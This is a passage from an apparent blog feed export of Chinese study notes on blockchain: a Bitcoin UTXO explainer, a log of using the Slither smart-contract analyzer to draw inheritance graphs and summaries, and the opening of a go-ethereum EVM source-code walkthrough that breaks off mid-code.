<p>当区块被添加到链上时，区块内所有交易的状态都会从未确认变为已确认。</p>
</li>
<li class="lvl-2">
<p>例如比特币，可以存储在一个块内的交易数量不是固定的，但是块的最大大小设置为大约 1 MB，块大小可以略小于1 MB。</p>
</li>
<li class="lvl-2">
<p>空块是有效的，这意味着可以挖掘空块并将其添加到链中。</p>
</li>
</ul>
<h1>交易:</h1>
<p>分解交易中存在的不同结构：</p>
<ol>
<li class="lvl-3">
<p>交易版本号：它是指定网络交易类型的版本号。通过交易编号，节点可以确定用于验证该特定交易的规则集。</p>
</li>
<li class="lvl-3">
<p>输出：交易输出由密码锁和时间组成。</p>
</li>
<li class="lvl-3">
<p>输入：交易输入由指针和解锁密钥组成。指针指向前一个交易输出。解锁密钥用于解锁输入指向的先前输出。每次输出被输入解锁时，它都会在区块链数据库中标记为已用。</p>
</li>
<li class="lvl-3">
<p>锁定时间：它指定交易是可以立即包含在区块链中还是在某个指定时间后包含在区块链中。</p>
</li>
</ol>
<p>UTXO is all those outputs that are yet to be unlocked by an input.<br />
<strong>UTXO 是所有尚未被输入解锁的输出。</strong></p>
<p>一旦一个输出被解锁，它们就会从循环供应中移除。新的输出取而代之。<br />
因此，未锁定输出的总和将始终等于新创建的输出的值的总和。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809172014.png" alt="20220809172014" /></p>
<h1>什么是UTXO?</h1>
<p>在比特币中，交易一直存在，直到它被执行：另一笔交易消费掉其UTXO。<br />
<strong>UTXO 代表未使用的交易输出</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>它是某人在执行交易后剩余的数字货币数量。</p>
</li>
<li class="lvl-2">
<p>交易完成后，未使用的输出将作为输入存回数据库，稍后可用于另一笔交易。</p>
</li>
</ul>
<h1>UTXO 是如何创建的？</h1>
<p><code>UTXO</code> 是通过使用现有的 UTXO 创建的。<br />
每笔比特币交易都由输入和输出组成。<br />
输入消耗一个现有的<code>UTXO</code>，而输出创建一个新的 <code>UTXO</code>。</p>
<h1>UTXO 模型</h1>
<p>它基于由block组成的一个个交易。<br />
UTXO 模型是许多加密货币通用的设计，最引人注目的是比特币。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用 UTXO 模型的加密货币不使用账户或余额。相反，UTXO 就像实物现金一样在用户之间转移。</p>
</li>
<li class="lvl-2">
<p>UTXO 模型中的每个事务都可以将系统转换到一个新状态，但是每个事务都转换到一个新状态是不可行的。</p>
</li>
<li class="lvl-2">
<p>网络参与者必须与当前状态保持同步。</p>
</li>
</ul>
<h1>举个栗子:</h1>
<ol>
<li class="lvl-3">
<p>假设从交易中收到以下比特币。这些交易中的每一个都是一个 UTXO。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809172651.png" alt="20220809172651" /></p>
<ol start="2">
<li class="lvl-3">
<p>现在我想买一辆 <code>0.5 BTC</code> 的车。</p>
</li>
<li class="lvl-3">
<p>为了转移<code>0.5 BTC</code>，需要选择一笔或多笔交易作为输入。</p>
</li>
<li class="lvl-3">
<p>这就是为什么比特币交易不同于银行，在银行的情况下，一个人会输入 <code>0.5 BTC</code> 的金额，按下转账，它会转到卖方，但比特币的情况并非如此，这里需要选择<strong>一个或多个UTXO作为输入</strong>。</p>
</li>
<li class="lvl-3">
<p>对于加密货币，您的账户中不存在金额。</p>
</li>
<li class="lvl-3">
<p>让我们选择 Sarah 的 <code>0.7 BTC</code> 作为购买汽车的输入。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809172743.png" alt="20220809172743" /></p>
<ol start="7">
<li class="lvl-3">
<p>在UTXO的情况下，输入的金额不能闲置，不能说剩下的<code>0.2 BTC</code>什么都不做。</p>
</li>
<li class="lvl-3">
<p>剩余的 <code>0.2 BTC</code>，必须以下列 3 种方式之一使用-</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>就像我们在上图中所做的那样，将剩余的金额发送回您的帐户。</p>
</li>
<li class="lvl-2">
<p>使用剩余金额作为交易费用。请记住，应该有一些交易费用，否则没有矿工将您的交易添加到阻止，并且它将保持未确认状态。</p>
</li>
<li class="lvl-2">
<p>将剩余金额发送给其他人。</p>
</li>
</ul>
<ol start="9">
<li class="lvl-3">
<p><code>0.5 BTC</code> 已发送至卖家但未添加任何费用，交易未确认，72 小时后退回 <code>0.7 BTC</code>。</p>
</li>
<li class="lvl-4">
<p>所以为了给卖家汇款，让我们把这 <code>0.2 BTC</code> 作为这笔交易的费用。</p>
</li>
<li class="lvl-4">
<p>提供交易手续费，无需提及，如果您没有将剩余金额发送给任何人，则视为交易手续费。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809172837.png" alt="20220809172837" /></p>
<ol start="12">
<li class="lvl-4">
<p>现在已经添加了交易费用，矿工将这笔交易包含在区块中，随后获得了 0.2 BTC 作为交易费用。</p>
</li>
<li class="lvl-4">
<p>让我们再看看我们原来的 UTXO。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809172902.png" alt="20220809172902" /></p>
<ol start="14">
<li class="lvl-4">
<p>Sarah 的 UTXO 已经不存在了，UTXO 只存在到没有从它那里完成另一笔交易，但现在它已经用于另一笔交易，即购买汽车。</p>
</li>
<li class="lvl-4">
<p>交易存储在一个区块内，也是改变区块哈希的四个因素之一。这意味着如果矿工选择不同的交易保持其他 4 个因素相同，则哈希将不同。</p>
</li>
<li class="lvl-4">
<p>决定区块哈希的因素</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>时间戳</p>
</li>
<li class="lvl-2">
<p>区块号：是当前区块在链中的序号。</p>
</li>
<li class="lvl-2">
<p>数据：存储在区块上的交易。</p>
</li>
<li class="lvl-2">
<p>随机数</p>
</li>
</ul>
<ol start="17">
<li class="lvl-4">
<p>如果这四个因素中的任何一个发生了变化，则哈希完全改变，这是由于雪崩效应。</p>
</li>
</ol>
<h1>UTXO集合</h1>
<p>区块链中存在的总 UTXO 代表一个集合，并且由每个比特币节点不断维护。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>每个交易都使用该集合中的元素并创建添加到该集合中的新元素。</p>
</li>
<li class="lvl-2">
<p>因此，该集合代表特定加密货币系统中的所有硬币。</p>
</li>
<li class="lvl-2">
<p>每次在区块链中接受新块时，都会更新 UTXO 集合。</p>
</li>
<li class="lvl-2">
<p>网络中的每个比特币节点都将在其本地存储中设置 UTXO 的精确副本。</p>
</li>
<li class="lvl-2">
<p>可以对完整的 UTXO 集合求和，以计算给定时间点加密货币的总供应量。</p>
</li>
<li class="lvl-2">
<p>在有效的区块链交易的情况下，只有未使用的输出可用于资助进一步的交易。</p>
</li>
<li class="lvl-2">
<p>只有未使用的输出可以用于进一步交易的条件是防止双重支出和欺诈的必要条件。</p>
</li>
</ul>
<h1>UTXO 模型的重要性</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>与语言无关的智能合约</code>：基于 UTXO 的智能合约独立于语言，允许 UTXO 开发独特的共识机制。</p>
</li>
<li class="lvl-2">
<p><code>支持去中心化交易所和原子交换</code>： UTXO 模型可以支持原子交换，因此无需第三方参与即可实现点对点加密交易。UTXO 的原子交换功能为用户钱包之间的直接加密货币交易提供了更好的便利。</p>
</li>
<li class="lvl-2">
<p><code>可扩展性优势</code>：设施或并行事务处理减少了区块链网络上的计算负载。</p>
</li>
<li class="lvl-2">
<p><code>隐私和安全</code>：每笔 UTXO 交易都使用新地址，因此无法跟踪交易。</p>
</li>
<li class="lvl-2">
<p><code>防止双重支出</code>：一个 UTXO 只能使用一次，这是区块链技术运行的基础，保证货币不会被多次使用。</p>
</li>
<li class="lvl-2">
<p><code>更灵活</code>：它提供比法定货币更大的灵活性。</p>
</li>
<li class="lvl-2">
<p><code>简单并行化</code>：它允许智能合约中更简单的交易并行化。</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.geeksforgeeks.org/what-is-unspent-transaction-output-utxo/">What is Unspent Transaction Output (UTXO)?</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-以太坊合约静态分析工具Slither使用记录</title>
    <url>/2022/59932.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>熟悉一下<code>SLITHER</code>该工具的使用，主要想用它的<code>graph</code>来帮助阅读sol源码</p>
<p><a href="https://github.com/crytic/slither/wiki/Usage">slither Usage</a></p>
<h1>介绍：</h1>
<blockquote>
<p>Slither是一个用Python 3编写的智能合约静态分析框架，提供如下功能：</p>
</blockquote>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>自动化漏洞检测。提供多项的漏洞检查模型，模型列表详见：<a href="https://github.com/crytic/slither#detectors">link</a></p>
</li>
<li class="lvl-2">
<p>自动优化检测。Slither可以检测编译器遗漏的代码优化项并给出优化建议。</p>
</li>
<li class="lvl-2">
<p>代码理解。Slither能够绘制合约的继承拓扑图，合约方法调用关系图等，帮助开发者理解代码。</p>
</li>
<li class="lvl-2">
<p>辅助代码审查。用户可以通过API与Slither进行交互。</p>
</li>
</ul>
</blockquote>
<h1>安装与启动：</h1>
<h2 id="docker安装：">docker安装：</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安裝 docker image：</span></span><br><span class="line">docker pull trailofbits/eth-security-toolbox</span><br></pre></td></tr></table></figure>
<h2 id="docker共享目录volume">docker共享目录volume:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker里创建目录:</span></span><br><span class="line"><span class="comment"># 源代码文件夹</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> contracts</span><br><span class="line"><span class="comment"># 库文件夹</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> @openzeppelin</span><br></pre></td></tr></table></figure>
<p>我是使用图形化工具共享目录<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/EC7266A8-3812-4827-8BCD-2CBFAA44330B.png" alt="EC7266A8-3812-4827-8BCD-2CBFAA44330B" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 共享源文件目录</span></span><br><span class="line">/Users/chanjerry/Documents/GitHub/blockchain/openzeppelin-contracts/contracts </span><br><span class="line"></span><br><span class="line">/home/contracts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享库文件目录</span></span><br><span class="line">/Users/chanjerry/Documents/GitHub/blockchain/cool-erc20/blacklist/node_modules/@openzeppelin</span><br><span class="line"></span><br><span class="line">/home/@openzeppelin</span><br></pre></td></tr></table></figure>
<h1>SLITHER使用:</h1>
<h2 id="检查solc版本">检查solc版本:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看已安装的solc版本列表</span></span><br><span class="line">solc-select versions</span><br><span class="line"><span class="comment"># 用use命令切换编译器版本</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞检测：">漏洞检测：</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开始扫描</span><br><span class="line">slither /home/contracts/token/ERC20/extensions/ERC20Snapshot.sol</span><br></pre></td></tr></table></figure>
<p>报错，不支持相对导入<code> import &quot;../ERC20.sol&quot;;</code>修改import语句，成<code>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 指定 --solc-remaps 来告诉编译器 openzeppelin 的具体位置</span><br><span class="line">slither /home/contracts/token/ERC20/extensions/scan/ERC20Snapshot_bak.sol --solc-remaps @openzeppelin/=/home/@openzeppelin/ </span><br></pre></td></tr></table></figure>
<p>扫描结果：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2859ABE2-0593-4DC4-9786-E6CDC6F945BF.png" alt="2859ABE2-0593-4DC4-9786-E6CDC6F945BF" /></p>
<h2 id="输出合约继承关系图：">输出合约继承关系图：</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出合约继承关系 --print inheritance-graph</span></span><br><span class="line">slither /home/contracts/token/ERC20/extensions/scan/ERC20Snapshot_bak.sol --solc-remaps @openzeppelin/=/home/@openzeppelin/ --<span class="built_in">print</span> inheritance-graph</span><br></pre></td></tr></table></figure>
<p>执行结果:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/881C71ED-C4E0-476D-81D8-879BE8B4D25A.png" alt="881C71ED-C4E0-476D-81D8-879BE8B4D25A" /></p>
<p>生成的是<code>.dot文件</code>使用在线工具，转换一下<code>.dot</code>格式的文件，来输出图形</p>
<p><a href="https://dreampuf.github.io/GraphvizOnline/#digraph%20G%20%7B%0A%0A%20%20subgraph%20cluster_0%20%7B%0A%20%20%20%20style%3Dfilled%3B%0A%20%20%20%20color%3Dlightgrey%3B%0A%20%20%20%20node%20%5Bstyle%3Dfilled%2Ccolor%3Dwhite%5D%3B%0A%20%20%20%20a0%20-%3E%20a1%20-%3E%20a2%20-%3E%20a3%3B%0A%20%20%20%20label%20%3D%20%22process%20%231%22%3B%0A%20%20%7D%0A%0A%20%20subgraph%20cluster_1%20%7B%0A%20%20%20%20node%20%5Bstyle%3Dfilled%5D%3B%0A%20%20%20%20b0%20-%3E%20b1%20-%3E%20b2%20-%3E%20b3%3B%0A%20%20%20%20label%20%3D%20%22process%20%232%22%3B%0A%20%20%20%20color%3Dblue%0A%20%20%7D%0A%20%20start%20-%3E%20a0%3B%0A%20%20start%20-%3E%20b0%3B%0A%20%20a1%20-%3E%20b3%3B%0A%20%20b2%20-%3E%20a3%3B%0A%20%20a3%20-%3E%20a0%3B%0A%20%20a3%20-%3E%20end%3B%0A%20%20b3%20-%3E%20end%3B%0A%0A%20%20start%20%5Bshape%3DMdiamond%5D%3B%0A%20%20end%20%5Bshape%3DMsquare%5D%3B%0A%7D">Graphviz在线使用</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/3ADC3166-CCB2-43A5-B9F8-52CE1EB66491.png" alt="3ADC3166-CCB2-43A5-B9F8-52CE1EB66491" /></p>
<p>图示说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果合约具有多重继承，则在连接线将按声明顺序标记。</p>
</li>
<li class="lvl-2">
<p><strong>以橙色突出显示的函数会覆盖父函数</strong>。（看override的情况）</p>
</li>
<li class="lvl-2">
<p>不直接相互覆盖（但由于多重继承而冲突）的函数将在受影响的合约节点底部以灰色字体突出显示。</p>
</li>
<li class="lvl-2">
<p>以红色突出显示的变量掩盖了父变量声明。</p>
</li>
<li class="lvl-2">
<p>类型变量contract以蓝色字体在括号中指定合约名称。</p>
</li>
</ul>
<blockquote>
<p>Useful！！！</p>
</blockquote>
<h2 id="输出合同的快速摘要">输出合同的快速摘要:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --print contract-summary</span></span><br><span class="line">slither /home/contracts/token/ERC20/extensions/scan/ERC20Snapshot_bak.sol --solc-remaps @openzeppelin/=/home/@openzeppelin/ --<span class="built_in">print</span> contract-summary</span><br></pre></td></tr></table></figure>
<p>这跟继承关系差不多，呈现的方式有些不一样。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C37B62B5-7370-4BFA-A83C-9D0B56BDA109.png" alt="C37B62B5-7370-4BFA-A83C-9D0B56BDA109" /></p>
<p>更多打印功能，可看<a href="https://github.com/crytic/slither/wiki/Printer-Documentation">slither Printer documentation</a>，这个工具还是蛮实用和有趣的,So cool ~</p>
<h2 id="输出可读的合同摘要">输出可读的合同摘要:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --print human-summary</span></span><br><span class="line">slither /home/contracts/token/ERC20/extensions/scan/ERC20Snapshot_bak.sol --solc-remaps @openzeppelin/=/home/@openzeppelin/ --<span class="built_in">print</span> human-summary</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/150FDB31-BD8C-4A9D-83B2-A6A768631844.png" alt="150FDB31-BD8C-4A9D-83B2-A6A768631844" /></p>
<p>内容大概有：代码总行数、汇编代码总行数、漏洞检测汇总信息等。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/article/1301#3-3-%E5%90%88%E7%BA%A6%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB">以太坊合约静态分析工具Slither简介与使用</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.frank.hk/blog/slither-solidity-scanner/">使用 SLITHER 來檢測你的 SOLIDITY 智能合約程式碼</a></p>
</li>
<li class="lvl-2">
<p><a href="https://segmentfault.com/a/1190000041329191">Graphviz的使用指南</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/crytic/slither/wiki/Usage">slither Usage</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/crytic/slither/wiki/Printer-Documentation">slither Printer documentation</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-以太坊源码分析-EVM对象</title>
    <url>/2022/17822.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>每处理一笔交易，就要新建一个 <code>EVM对象</code> 来执行交易中的数据。<br />
这是在执行交易的入口 <code>ApplyTransaction</code> 函数中体现的：</p>
<figure class="highlight go"><figcaption><span>core/state_processor.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ApplyTransaction</span><span class="params">(config *params.ChainConfig, bc ChainContext, author *common.Address, gp *GasPool, statedb *state.StateDB, header *types.Header, tx *types.Transaction, usedGas *<span class="type">uint64</span>, cfg vm.Config)</span></span> (*types.Receipt, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用区块/交易相关信息，新建一个EVM对象,来处理交易</span></span><br><span class="line">	vmenv := vm.NewEVM(blockContext, vm.TxContext&#123;&#125;, statedb, config, cfg)</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>以太坊虚拟机EVM:</h1>
<p>evm 模块的核心对象是 EVM，它代表了一个以太坊虚拟机，用于创建或调用某个合约。<br />
EVM 对象内部主要依赖三个对象：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>解释器 <code>Interpreter</code></p>
</li>
<li class="lvl-2">
<p>虚拟机相关配置对象 <code>vm.Config</code></p>
</li>
<li class="lvl-2">
<p>以太坊状态数据库 <code>StateDB</code></p>
</li>
</ul>
<p>这3个对象后面会一一介绍，先看看EVM对象本身的源码。</p>
<h1>EVM数据结构：</h1>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> EVM <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Context provides auxiliary blockchain related information</span></span><br><span class="line">	<span class="comment">// 辅助信息对象(包括GasLimit，BlockNumber等信息)</span></span><br><span class="line">	Context BlockContext</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 交易相关的信息(包括ORIGIN，GASPRICE)</span></span><br><span class="line">	TxContext</span><br><span class="line"></span><br><span class="line">	<span class="comment">// StateDB gives access to the underlying state</span></span><br><span class="line">	<span class="comment">// 为EVM提供StateDB相关操作</span></span><br><span class="line">	StateDB StateDB</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Depth is the current call stack</span></span><br><span class="line">	<span class="comment">// 记录当前调用的栈的深度</span></span><br><span class="line">	depth <span class="type">int</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// chainConfig contains information about the current chain</span></span><br><span class="line">	<span class="comment">// 链配置信息 包含了当前的区块链的信息</span></span><br><span class="line">	chainConfig *params.ChainConfig</span><br><span class="line"></span><br><span class="line">	<span class="comment">// chain rules contains the chain rules for the current epoch</span></span><br><span class="line">	<span class="comment">// 链规则</span></span><br><span class="line">	chainRules params.Rules</span><br><span class="line"></span><br><span class="line">	<span class="comment">// virtual machine configuration options used to initialise the</span></span><br><span class="line">	<span class="comment">// evm.</span></span><br><span class="line">	<span class="comment">// 虚拟机配置</span></span><br><span class="line">	Config Config</span><br><span class="line"></span><br><span class="line">	<span class="comment">// global (to this context) ethereum virtual machine</span></span><br><span class="line">	<span class="comment">// used throughout the execution of the tx.</span></span><br><span class="line">	<span class="comment">// 解释器</span></span><br><span class="line">	interpreter *EVMInterpreter</span><br><span class="line"></span><br><span class="line">	<span class="comment">// abort is used to abort the EVM calling operations</span></span><br><span class="line">	<span class="comment">// <span class="doctag">NOTE:</span> must be set atomically</span></span><br><span class="line">	<span class="comment">// 用于中止EVM调用操作</span></span><br><span class="line">	abort <span class="type">int32</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// callGasTemp holds the gas available for the current call. This is needed because the</span></span><br><span class="line">	<span class="comment">// available gas is calculated in gasCall* according to the 63/64 rule and later applied in opCall*.</span></span><br><span class="line">	<span class="comment">// 当前call可用的gas</span></span><br><span class="line">	callGasTemp <span class="type">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建<code>EVM</code>对象需要依赖以下信息：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>BlockContext</code>: 区块相关信息</p>
</li>
<li class="lvl-2">
<p><code>TxContext</code>: 交易相关信息</p>
</li>
<li class="lvl-2">
<p><code>chainConfig</code>:链配置信息</p>
</li>
<li class="lvl-2">
<p><code>chainRules</code>:链规则</p>
</li>
<li class="lvl-2">
<p><code>Config</code>:虚拟机解释器配置信息</p>
</li>
<li class="lvl-2">
<p><code>interpreter</code>:EVM 解释器</p>
</li>
</ul>
<p>需要记录以下信息：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>depth</code>: 记录当前调用的栈的深度</p>
</li>
<li class="lvl-2">
<p><code>abort</code>: 用于中止EVM调用操作</p>
</li>
<li class="lvl-2">
<p><code>callGasTemp</code>: 当前call可用的gas</p>
</li>
</ul>
<h1>创建EVM所需信息：</h1>
<h2 id="BlockContext-区块信息">BlockContext 区块信息:</h2>
<p>其中<code>BlockContext</code>里包含了区块的相关信息,例如当前区块的矿工地址、当前区块号等</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BlockContext provides the EVM with auxiliary information. Once provided</span></span><br><span class="line"><span class="comment">// it shouldn&#x27;t be modified.</span></span><br><span class="line"><span class="comment">// 上下文为EVM提供辅助信息。 一旦提供，不应该修改。</span></span><br><span class="line"><span class="keyword">type</span> BlockContext <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// CanTransfer returns whether the account contains</span></span><br><span class="line">	<span class="comment">// sufficient ether to transfer the value</span></span><br><span class="line">	<span class="comment">// 返回账户余额是否足够执行交易</span></span><br><span class="line">	CanTransfer CanTransferFunc</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Transfer transfers ether from one account to the other</span></span><br><span class="line">	<span class="comment">// 将以太从一个帐户转移到另一个帐户</span></span><br><span class="line">	<span class="comment">// 转账函数</span></span><br><span class="line">	Transfer TransferFunc</span><br><span class="line"></span><br><span class="line">	<span class="comment">// GetHash returns the hash corresponding to n</span></span><br><span class="line">	<span class="comment">// GetHash用来返回入参n对应的hash值</span></span><br><span class="line">	<span class="comment">// 返回hash</span></span><br><span class="line">	GetHash GetHashFunc</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Block information</span></span><br><span class="line">	<span class="comment">// 区块相关信息</span></span><br><span class="line">	Coinbase    common.Address <span class="comment">// Provides information for COINBASE // 挖出当前区块的矿工地址</span></span><br><span class="line">	GasLimit    <span class="type">uint64</span>         <span class="comment">// Provides information for GASLIMIT // 当前区块 gas 限额</span></span><br><span class="line">	BlockNumber *big.Int       <span class="comment">// Provides information for NUMBER // 当前区块号</span></span><br><span class="line">	Time        *big.Int       <span class="comment">// Provides information for TIME //</span></span><br><span class="line">	Difficulty  *big.Int       <span class="comment">// Provides information for DIFFICULTY // 当前区块难度</span></span><br><span class="line">	BaseFee     *big.Int       <span class="comment">// Provides information for BASEFEE // 当前区块的基础费用</span></span><br><span class="line">	Random      *common.Hash   <span class="comment">// Provides information for RANDOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="TxContext-交易信息">TxContext 交易信息:</h2>
<p>其中<code>TxContext</code>里包含了交易的相关信息：交易发起者、 交易的gas价格</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TxContext provides the EVM with information about a transaction.</span></span><br><span class="line"><span class="comment">// All fields can change between transactions.</span></span><br><span class="line"><span class="comment">// TXContext为EVM提供有关交易的信息。</span></span><br><span class="line"><span class="comment">// 所有字段都可以在交易之间发生变化。</span></span><br><span class="line"><span class="keyword">type</span> TxContext <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Message information</span></span><br><span class="line">	Origin   common.Address <span class="comment">// Provides information for ORIGIN // 交易发起者</span></span><br><span class="line">	GasPrice *big.Int       <span class="comment">// Provides information for GASPRICE // 交易的 gas 价格</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>区块信息和交易信息在<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-functions">solidity文档的区块和交易属性</a>有列举出来:</p>
<p>区块信息：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希 —— 仅可用于最新的 256 个区块且不包括当前区块，否则返回 0 。</p>
</li>
<li class="lvl-2">
<p><code>block.basefee (uint)</code>: 当前区块的基础费用，参考： (EIP-3198 和 EIP-1559)</p>
</li>
<li class="lvl-2">
<p><code>block.chainid (uint)</code>: 当前链 id</p>
</li>
<li class="lvl-2">
<p><code>block.coinbase ( address )</code>: 挖出当前区块的矿工地址</p>
</li>
<li class="lvl-2">
<p><code>block.difficulty ( uint )</code>: 当前区块难度</p>
</li>
<li class="lvl-2">
<p><code>block.gaslimit ( uint )</code>: 当前区块 gas 限额</p>
</li>
<li class="lvl-2">
<p><code>block.number ( uint )</code>: 当前区块号</p>
</li>
<li class="lvl-2">
<p><code>block.timestamp ( uint)</code>: 自 unix epoch 起始当前区块以秒计的时间戳</p>
</li>
</ul>
<p>交易信息：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tx.gasprice (uint)</code>: 交易的 gas 价格</p>
</li>
<li class="lvl-2">
<p><code>tx.origin ( address )</code>: 交易发起者（完全的调用链）</p>
</li>
<li class="lvl-2">
<p><code>msg.data ( bytes )</code>: 完整的 calldata</p>
</li>
<li class="lvl-2">
<p><code>msg.sender ( address )</code>: 消息发送者（当前调用）</p>
</li>
<li class="lvl-2">
<p><code>msg.sig ( bytes4 )</code>: calldata 的前 4 字节（也就是函数标识符）</p>
</li>
<li class="lvl-2">
<p><code>msg.value ( uint )</code>: 随消息发送的 wei 的数量</p>
</li>
</ul>
<h2 id="chainConfig-链配置信息">chainConfig 链配置信息</h2>
<figure class="highlight go"><figcaption><span>params/config.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ChainConfig <span class="keyword">struct</span> &#123;</span><br><span class="line">	ChainID *big.Int <span class="string">`json:&quot;chainId&quot;`</span> <span class="comment">// chainId identifies the current chain and is used for replay protection</span></span><br><span class="line"></span><br><span class="line">	HomesteadBlock *big.Int <span class="string">`json:&quot;homesteadBlock,omitempty&quot;`</span> <span class="comment">// Homestead switch block (nil = no fork, 0 = already homestead)</span></span><br><span class="line"></span><br><span class="line">	DAOForkBlock   *big.Int <span class="string">`json:&quot;daoForkBlock,omitempty&quot;`</span>   <span class="comment">// TheDAO hard-fork switch block (nil = no fork)</span></span><br><span class="line">	DAOForkSupport <span class="type">bool</span>     <span class="string">`json:&quot;daoForkSupport,omitempty&quot;`</span> <span class="comment">// Whether the nodes supports or opposes the DAO hard-fork</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// EIP150 implements the Gas price changes (https://github.com/ethereum/EIPs/issues/150)</span></span><br><span class="line">	EIP150Block *big.Int    <span class="string">`json:&quot;eip150Block,omitempty&quot;`</span> <span class="comment">// EIP150 HF block (nil = no fork)</span></span><br><span class="line">	EIP150Hash  common.Hash <span class="string">`json:&quot;eip150Hash,omitempty&quot;`</span>  <span class="comment">// EIP150 HF hash (needed for header only clients as only gas pricing changed)</span></span><br><span class="line"></span><br><span class="line">	EIP155Block *big.Int <span class="string">`json:&quot;eip155Block,omitempty&quot;`</span> <span class="comment">// EIP155 HF block</span></span><br><span class="line">	EIP158Block *big.Int <span class="string">`json:&quot;eip158Block,omitempty&quot;`</span> <span class="comment">// EIP158 HF block</span></span><br><span class="line"></span><br><span class="line">	ByzantiumBlock      *big.Int <span class="string">`json:&quot;byzantiumBlock,omitempty&quot;`</span>      <span class="comment">// Byzantium switch block (nil = no fork, 0 = already on byzantium)</span></span><br><span class="line">	ConstantinopleBlock *big.Int <span class="string">`json:&quot;constantinopleBlock,omitempty&quot;`</span> <span class="comment">// Constantinople switch block (nil = no fork, 0 = already activated)</span></span><br><span class="line">	PetersburgBlock     *big.Int <span class="string">`json:&quot;petersburgBlock,omitempty&quot;`</span>     <span class="comment">// Petersburg switch block (nil = same as Constantinople)</span></span><br><span class="line">	IstanbulBlock       *big.Int <span 